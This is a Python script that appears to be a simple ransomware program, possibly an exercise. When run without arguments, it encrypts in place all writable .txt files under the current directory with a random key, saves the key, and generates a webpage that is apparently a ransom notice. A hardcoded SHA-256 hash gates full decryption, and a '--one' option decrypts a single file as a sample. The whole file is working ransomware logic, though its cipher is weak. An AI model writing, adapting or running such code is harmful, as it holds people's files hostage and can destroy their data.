#!/usr/bin/python
import tempfile, argparse
import os, sys, random, hashlib
from pathlib import *
from encrypt import encrypt_line, save_key, encrypt_line_v2
from decrypt import decrypt_line, find_key, delete_key_file, decrypt_line_v2
from webpage import create_webpage

def hash(text):
    result = hashlib.sha256(text.encode())

    # Only achieved if the correct private key entered
    if result.hexdigest() == "4c8708f6067eff3b8e8668b8d18e93cd88df5ffd97d01bdc9690ecac9bf9297a":
        return True
    else:
        return False

def walk(input_path, key, action):
    p = Path(input_path)
    if (p.exists()):
        for file in p.rglob('*.txt'):
            if (os.access(file, os.W_OK) and os.access(file, os.R_OK)):
                try:
                    t = tempfile.NamedTemporaryFile(mode="r+")

                    with open(file, mode='r', encoding="utf8") as f:
                        for line in f:
                            if (action):
                                new_line = encrypt_line_v2(line, key)
                            else:
                                new_line = decrypt_line_v2(line, key)
                            t.write(new_line)

                    t.seek(0)

                    with open(file, mode='w', encoding="utf8") as f:
                        for line in t:
                            f.write(line)

                    t.close()

                except IOError as e:
                    print(str(file) + " raises exception:\n" + e)
            else:
                print(str(file) + " does not have correct permissions")


        if action:
            # if encrypted successfully, then save the key in .key file
            save_key(key)
        else:
            # else if decrypted successfully, then delete the key file
            delete_key_file(input_path)

def walk_one(input_path, key, action, one_file):
    p = Path(input_path)
    count = 0
    if (p.exists()):
        for file in p.rglob('*.txt'):
            if (os.access(file, os.W_OK) and os.access(file, os.R_OK)):
                try:
                    t = tempfile.NamedTemporaryFile(mode="r+")

                    with open(file, mode='r', encoding="utf8") as f:
                        for line in f:
                            if (action):
                                new_line = encrypt_line_v2(line, key)
                            else:
                                new_line = decrypt_line_v2(line, key)
                            t.write(new_line)

                    t.seek(0)

                    with open(file, mode='w', encoding="utf8") as f:
                        for line in t:
                            f.write(line)

                    t.close()

                    count = count + 1
                    if count == 1 and one_file:
                        sys.exit(str(file) + " is decrypted." )

                except IOError as e:
                    print(str(file) + " raises exception:\n" + e)
            else:
                print(str(file) + " does not have correct permissions")

        # saving the key in .key file
        if action:
            save_key(key)


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Enter the private key:")
    parser.add_argument('-d', type=str, dest='decrypt', default="")
    parser.add_argument('--one', dest='one_file', default=False, action='store_true')
    results = parser.parse_args()

    if hash(results.decrypt):
        key = find_key('.')
        if key is not None:
            walk('.', key, False)
    elif results.decrypt == "" and results.one_file:
        key = find_key('.')
        if key is not None:
            walk_one('.', key, False, results.one_file)
    elif (not hash(results.decrypt)) and (results.decrypt != ""):
        print("Entered wrong key\nEnter 'exit' for exiting or Re-enter the key\n")
        tmp_bool = True

        while tmp_bool:
            input_key = input("\nPlease re-enter the key:\n")
            if str(input_key).lower() == "exit":
                sys.exit("\nExiting....")
            else:
                tmp_bool = not(hash(input_key))
                if not tmp_bool:
                    key = find_key('.')
                    if key is not None:
                        walk('.', key, False)
    else:
        key = random.randint(1, 127)
        walk('.', key, True)
        create_webpage()






